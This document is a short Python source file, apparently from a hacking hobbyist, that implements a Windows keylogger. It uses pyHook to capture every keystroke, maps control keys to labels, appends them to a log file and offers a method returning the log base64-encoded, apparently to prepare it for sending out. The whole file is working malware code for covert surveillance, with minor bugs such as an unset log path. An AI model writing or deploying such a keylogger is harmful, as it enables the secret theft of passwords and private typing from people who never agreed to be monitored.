# Date: 11/11/2017
# Author: Ethical-H4CK3R
# Description: Simple Keylogger

import base64
import pyHook
import pythoncom

class Keylogger(object):
 ''' Keylogger '''
 
 keys = {

     # CTRL
     1 : '<CTRL-A>',  11 : '<CTRL-K>',  19 : '<CTRL-S>',
     2 : '<CTRL-B>',  12 : '<CTRL-L>',  20 : '<CTRL-T>',
     3 : '<CTRL-C>',  13 : '<CTRL-M>',  21 : '<CTRL-U>',
     4 : '<CTRL-D>',  14 : '<CTRL-N>',  22 : '<CTRL-V>',
     5 : '<CTRL-E>',  15 : '<CTRL-O>',  23 : '<CTRL-W>',
     6 : '<CTRL-F>',  16 : '<CTRL-P>',  24 : '<CTRL-X>',
     7 : '<CTRL-G>',  17 : '<CTRL-Q>',  25 : '<CTRL-Y>',
    10 : '<CTRL-J>',  18 : '<CTRL-R>',  26 : '<CTRL-Z>',

     # EXTRA
     8 : '<BKS>',  13 : '\n',  127 : '<DEL>',
     9 : '<TAB>',  27 : '<ESC>'     
 }

 def __init__(self):
  self.keylog = None
  
 def read(self):
  try:
   with open(self.log, 'r') as f:return base64.b64encode(f.read())
  except:pass 
    
 def pressed(self, key):
  try:
   if not key.Ascii:return
   with open(self.log, 'a') as f:
    f.write(self.keys[key.Ascii] if key.Ascii in self.keys else chr(key.Ascii))
  except:pass
  finally:return -1

 def keystrokes(self):
  hm = pyHook.HookManager()
  hm.KeyDown = self.pressed
  self.keylog = True
  hm.HookKeyboard()  
  while self.keylog:
   try:pythoncom.PumpWaitingMessages()
   except:pass
  else:hm.UnhookKeyboard()
